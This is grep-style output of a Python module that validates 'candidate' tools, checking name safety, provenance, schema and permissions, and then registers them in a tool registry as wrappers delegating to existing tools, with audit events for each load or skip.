/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:56:    """Runtime wrapper that delegates execution to an existing registered tool."""
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:58:    def __init__(self, candidate: ToolCandidate, target_tool: str, registry: ToolRegistry) -> None:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:59:        self.name = candidate.name
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:60:        self.description = candidate.description
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:61:        self.permissions = _permissions_from_candidate(candidate.permissions)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:62:        self._schema = {
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:63:            "name": candidate.name,
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:64:            "description": candidate.description,
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:65:            "parameters": candidate.schema,
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:67:        self._candidate_id = candidate.id
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:68:        self._target_tool = target_tool
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:69:        self._registry = registry
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:72:    def candidate_id(self) -> str:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:73:        return self._candidate_id
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:76:    def target_tool(self) -> str:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:77:        return self._target_tool
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:79:    def get_schema(self) -> dict[str, Any]:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:80:        return dict(self._schema)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:83:        return self._registry.execute(self._target_tool, **kwargs)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:87:    """Validate and register enabled candidates with explicit implementations."""
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:89:    def __init__(self, store: CandidateStore, registry: ToolRegistry) -> None:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:91:        self._registry = registry
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:93:    def load_enabled(self, provider_name: str) -> CandidateLoadReport:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:94:        """Load enabled candidates for *provider_name* into the tool registry.
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:96:        Candidates are skipped unless they pass lifecycle, schema,
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:97:        provenance, implementation, permission, provider-enable, and conflict
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:98:        checks. Every load or skip emits a structured audit event.
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:102:        for candidate in self._store.list_all(state=ToolLifecycleState.ENABLED, limit=1000):
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:103:            reason = self._validate(candidate, provider_name)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:105:                skipped.append(CandidateLoadIssue(candidate.id, candidate.name, reason))
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:106:                _emit_audit("tool.candidate.load_skipped", candidate, provider_name, reason, "deny")
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:109:            target_tool = str(candidate.implementation["tool"])
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:110:            self._registry.register(CandidateDelegatedTool(candidate, target_tool, self._registry))
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:111:            loaded.append(candidate.name)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:112:            _emit_audit(
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:113:                "tool.candidate.loaded", candidate, provider_name, f"delegates:{target_tool}"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:117:    def _validate(self, candidate: ToolCandidate, provider_name: str) -> str:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:118:        if candidate.state is not ToolLifecycleState.ENABLED:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:119:            return f"candidate state is {candidate.state.value}, not enabled"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:120:        if not _SAFE_NAME_RE.match(candidate.name):
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:121:            return "candidate name is not a safe tool identifier"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:122:        if not candidate.provenance.strip():
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:123:            return "candidate provenance is missing"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:124:        schema_error = _validate_schema(candidate.schema)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:125:        if schema_error:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:126:            return schema_error
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:127:        permission_error = _validate_permissions(candidate.permissions)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:130:        impl = candidate.implementation
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:132:            return "candidate implementation is missing"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:134:            return "candidate implementation must be an object"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:138:        target_tool = str(impl.get("tool") or "")
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:139:        if not _SAFE_NAME_RE.match(target_tool):
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:140:            return "delegated tool target is not a safe tool identifier"
```
